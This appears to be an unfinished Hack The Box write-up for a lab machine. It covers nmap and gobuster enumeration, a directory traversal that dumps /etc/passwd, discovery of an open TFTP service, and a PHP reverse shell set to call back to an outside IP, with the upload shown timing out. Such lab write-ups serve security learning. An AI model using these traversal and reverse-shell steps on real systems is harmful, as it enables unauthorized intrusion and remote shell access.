## ----------->> PathFinder <<-----------

// Start Enumerate with nmap 

    $ nmap -sC -Pn -A -sV 10.10.10.55 -p-
    Nmap scan report for 10.10.10.55
    Host is up (0.36s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was http://10.10.10.55/?file=index.php

// navigating to http://10.10.10.55 redirects us to http://10.10.10.55/?file=index.php
    
// Direction search with gobuster

    $ gobuster dir -u http://10.10.10.55/ -w /usr/share/wordlists/dirb/common.txt -q -n -e
    http://10.10.10.55/.hta                 [Size: 276]
    http://10.10.10.55/.htaccess            [Size: 276]
    http://10.10.10.55/.htpasswd            [Size: 276]
    http://10.10.10.55/fonts                [Size: 310] [--> http://10.10.10.55/fonts/]
    http://10.10.10.55/images               [Size: 311] [--> http://10.10.10.55/images/]
    http://10.10.10.55/index.php            [Size: 304] [--> http://10.10.10.55/]       
    http://10.10.10.55/server-status        [Size: 276]    

// not much on gobuster so we open burpsuite and sent the request to reapter 
// then we change input to ../../../../etc/passwd
![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Included/1.png)

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    mike:x:1000:1000:mike:/home/mike:/bin/bash
    tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin

// As we can see the server is vulnerable for Directory Traversal , if we can upload file we could call him and get shell.
// since we dont have a way to upload file at this time we will continue enumerate
// when waching close on the passwd users we can see there is a tftp user
    
    tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
        
// since we didnt discover any tftp service with nmap lets try UDP scan

    $ sudo nmap -sU -v 10.10.10.55
    Nmap scan report for 10.10.10.55
    Host is up (0.15s latency).
    Not shown: 995 closed ports
    PORT      STATE         SERVICE
    69/udp    open|filtered tftp
    764/udp   open|filtered omserv
    16402/udp open|filtered unknown
    34861/udp open|filtered unknown
    37144/udp open|filtered unknown
    
// There is really tftp service on port 69
// lets try to connect tftp

    $ tftp 10.10.10.55 69
    tftp> ?
    Commands may be abbreviated.  Commands are:

    connect 	connect to remote tftp
    mode    	set file transfer mode
    put     	send file
    get     	receive file
    quit    	exit tftp
    verbose 	toggle verbose mode
    trace   	toggle packet tracing
    status  	show current status
    binary  	set mode to octet
    ascii   	set mode to netascii
    rexmt   	set per-packet retransmission timeout
    timeout 	set total retransmission timeout
    ?       	print help information
// Ok, we have connection to server to Upload/Download files!, But, how can we know which directory the file uploaded will be stored ?
// again we will check passwd

    tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
// /var/lib/tftpboot

### -----Foothold------

// First lets make php reverse shell to upload

    $ cp /usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php php-reverse-shell.php
// Chane IP and Port

    $ nano php-reverse-shell.php
    ...
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '10.10.16.7';  // CHANGE THIS
    $port = 1444;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    ...
--------------------------------------------------------------------
---ERROR---
TFTP put 
TIMED OUT
// will come back later

